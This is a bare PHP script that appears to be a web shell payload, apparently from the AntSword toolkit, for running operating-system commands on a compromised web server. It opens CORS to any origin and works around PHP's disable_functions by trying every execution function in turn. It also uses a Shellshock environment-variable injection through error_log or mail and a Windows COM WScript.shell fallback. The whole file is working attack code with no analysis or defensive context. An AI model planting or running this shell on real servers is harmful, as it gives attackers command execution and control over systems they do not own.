<?php

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Allow-Methods: *');
//header("Content-Type: text/html;charset=utf-8");
//header("Content-Type: text/html;charset=GBK");

ob_start();
try {
    $p = 'cmd';//cmd
    $cmd = 'dir';

    $envstr = '';//空

    $path = dirname($_SERVER["SCRIPT_FILENAME"]);

    $cmd = substr($path, 0, 1) == "/" ? "-c \"{$cmd}\"" : "/c \"{$cmd}\"";
    if (substr($path, 0, 1) == "/") {
        @putenv("PATH=" . getenv("PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    } else {
        @putenv("PATH=" . getenv("PATH") . ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
    }
    $r = "{$p} {$cmd}";

    function canIUse($f) {
        $d = explode(",", @ini_get("disable_functions"));
        if (empty($d)) {
            $d = array();
        } else {
            $d = array_map('trim', array_map('strtolower', $d));
        }
        return (function_exists($f) && is_callable($f) && !in_array($f, $d));
    }

    function runShellShock($path, $c) {
        if (substr($path, 0, 1) == "/" && canIUse('putenv') && (canIUse('error_log') || canIUse('mail'))) {
            if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
                $tmp = tempnam(sys_get_temp_dir(), 'as');
                putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
                if (canIUse('error_log')) {
                    error_log("a", 1);
                } else {
                    mail("a@127.0.0.1", "", "", "-bv");
                }
            } else {
                return False;
            }
            $output = @file_get_contents($tmp);
            @unlink($tmp);
            if ($output != "") {
                print($output);
                return True;
            }
        }
        return False;
    }

    function runCmd($cmd) {
        $path = dirname($_SERVER["SCRIPT_FILENAME"]);
        $ret = 0;
        if (canIUse('system')) {
            @system($cmd, $ret);
        } elseif (canIUse('passthru')) {
            @passthru($cmd, $ret);
        } elseif (canIUse('shell_exec')) {
            print(@shell_exec($cmd));
        } elseif (canIUse('exec')) {
            @exec($cmd, $o, $ret);
            print(join(" ", $o));
        } elseif (canIUse('popen')) {
            $fp = @popen($cmd, 'r');
            while (!@feof($fp)) {
                print(@fgets($fp, 2048));
            }
            @pclose($fp);
        } elseif (canIUse('proc_open')) {
            $p = @proc_open($cmd, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
            while (!@feof($io[1])) {
                print(@fgets($io[1], 2048));
            }
            while (!@feof($io[2])) {
                print(@fgets($io[2], 2048));
            }
            @fclose($io[1]);
            @fclose($io[2]);
            @proc_close($p);
        } elseif (canIUse('antsystem')) {
            @antsystem($cmd);
        } elseif (runShellShock($path, $cmd)) {
            return $ret;
        } elseif (substr($path, 0, 1) != "/" && @class_exists("COM")) {
            $w = new COM('WScript.shell');
            $e = $w->exec($cmd);
            $so = $e->StdOut();
            $ret .= $so->ReadAll();
            $se = $e->StdErr();
            $ret .= $se->ReadAll();
            print($ret);
        } else {
            $ret = 127;
        }
        return $ret;
    }

    $ret = @runcmd($r . " 2>&1");
    print ($ret != 0) ? "ret={$ret}" : "";;
} catch (Exception $e) {
    echo "ERROR://" . $e->getMessage();
};

?>